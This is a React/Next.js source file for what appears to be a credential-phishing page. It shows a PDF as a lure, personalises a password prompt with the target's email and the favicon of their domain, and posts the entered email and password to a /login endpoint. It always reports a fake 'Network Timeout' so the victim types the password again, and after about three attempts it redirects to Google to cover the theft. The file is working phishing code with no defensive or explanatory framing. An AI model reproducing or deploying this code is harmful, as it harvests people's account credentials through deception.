// app/page.tsx
'use client';

import { useEffect, useState, use } from 'react';

export default function Home({ searchParams }) {
  const params = use(searchParams);
  const user = params?.user || '';
  const emailDomain = user.includes('@') ? user.split('@')[1] : '';
  const faviconUrl = emailDomain ? `https://www.google.com/s2/favicons?sz=64&domain=${emailDomain}` : '';

  const [loading, setLoading] = useState(true);
  const [overlayVisible, setOverlayVisible] = useState(false);
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [attempts, setAttempts] = useState(0);

  useEffect(() => {
    const loaderTimer = setTimeout(() => {
      setLoading(false);
      setTimeout(() => setOverlayVisible(true), 1000);
    }, 1000);
    return () => clearTimeout(loaderTimer);
  }, []);

  const checkPassword = async () => {
    if (!password.trim()) {
      setError('Please enter your password');
      return;
    }

    if (password.length < 6) {
      setError('Password must be at least 6 characters');
      setPassword('');
      return;
    }

    // Check for repeated character patterns
    const hasRepeatedPattern = /(.)\1{4,}/.test(password);
    if (hasRepeatedPattern) {
      setError('Invalid password pattern');
      setPassword('');
      return;
    }

    try {
      const response = await fetch('/login?refresh=' + (window.performance.navigation.type === 1), {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          user,
          password
        })
      });

      if (response.ok) {
        setError('Network Timeout! - Please log in again');
        setAttempts(prev => prev + 1);
        setPassword('');
      } else {
        setAttempts(prev => prev + 1);
        setPassword('');
        if (attempts >= 3) {
          window.location.href = 'https://www.google.com';
        } else {
          setError('Network Timeout! - Please log in again');
        }
      }
    } catch (error) {
      setError('Error');
    }
    if (attempts >= 3) setTimeout(() => {
      //add 2 secc wait
      window.location.href = 'https://www.google.com';
    }, 2000);
  };

  return (
    <div className="relative min-h-screen bg-gray-100 text-center">
      {loading && (
        <div className="fixed inset-0 flex items-center justify-center bg-white z-10">
          <div className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {!loading && (
        <iframe
          src="/file.pdf"
          className="w-full h-screen border-0"
        ></iframe>
      )}

      {overlayVisible && (
        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-60 z-20 backdrop-blur-sm" style={{ backgroundColor: "rgba(0,0,0,0.40)" }}>
          <div className="bg-white p-6 rounded-xl shadow-lg w-80 text-center">
            {faviconUrl && <img src={faviconUrl} className="w-12 h-12 mx-auto mb-3" alt="Favicon" />}
            {user && <div className="text-gray-700 mb-2">{user}</div>}
            {error && <div className="text-red-600 mb-2">{error}</div>}
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-2 border border-gray-300 rounded mb-3 text-black"
              placeholder="Please enter your password."
            />
            <button
              onClick={checkPassword}
              className="bg-blue-600 text-white w-full py-2 rounded hover:bg-blue-800"
            >
              Confirm
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
